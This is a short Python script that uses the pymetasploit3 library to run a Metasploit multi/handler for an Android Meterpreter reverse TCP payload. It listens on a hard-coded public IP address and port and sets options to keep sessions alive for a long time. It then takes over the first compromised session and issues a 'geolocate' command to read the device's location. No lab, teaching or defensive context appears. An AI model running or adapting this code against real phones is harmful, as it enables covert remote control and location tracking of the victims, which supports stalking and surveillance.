from pymetasploit3.msfrpc import MsfRpcClient


client = MsfRpcClient("securepassword", ssl=True)

exploit = client.modules.use("exploit", "multi/handler")
payload = client.modules.use("payload", "android/meterpreter/reverse_tcp")
payload.runoptions["LHOST"] = "45.56.113.154"
payload.runoptions["LPORT"] = 101
payload.runoptions["AndroidWakelock"] = True
payload.runoptions["AutoUnhookProcess"] = True
payload.runoptions["SessionCommunicationTimeout"] = 99999


exploit.execute(payload=payload)

client.sessions.list

shell = client.sessions.session("1")
shell.write("geolocate")
print(shell.read())
